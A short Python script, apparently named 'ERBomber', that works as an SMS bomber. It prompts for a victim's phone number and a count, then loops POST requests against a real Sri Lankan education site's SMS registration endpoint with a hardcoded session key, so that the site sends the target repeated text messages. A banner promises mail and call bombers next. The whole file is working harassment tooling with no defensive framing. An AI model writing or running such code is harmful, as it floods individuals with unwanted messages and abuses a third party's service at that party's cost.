import urllib

import os

os.system('clear && figlet Error Killer')


name = """ 
_______________________________________________________________________
>>> Comming Soon
   
    [Mail BOMBER]
    [Call BOMBER]
_______________________________________________________________________
"""

print(name, "\n")


try:
    import requests

except ImportError:
    print('%s Requests isn\'t installed, installing now.')
    os.system('pip3 install requests')
    print('%s Requests has been installed.')
    os.system('clear  && figlet Error Killer')
    import requests


def main():
    print('Enter Phone Number ex- (0789876576)')
    x = str(input("[+]  -"))
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    s = int(input("Enter Amount - "))
    print("\nBlastin - ", x)
    ss = 0
    while s > ss:
        requests.post(url, data=myobj)
        print(1+ss, "SMS Sent")
        ss += 1
    os.system('figlet FINISHED')
    again()


def again():
    again = input('\nDo You want again use ERBomber (y/n) - ')
    if again == "y" or "Y":
        main()
    elif again == "n" or "N":
        quit()
    else:
        print('Enter valid letter')
        again()


if __name__ == "__main__":
    main()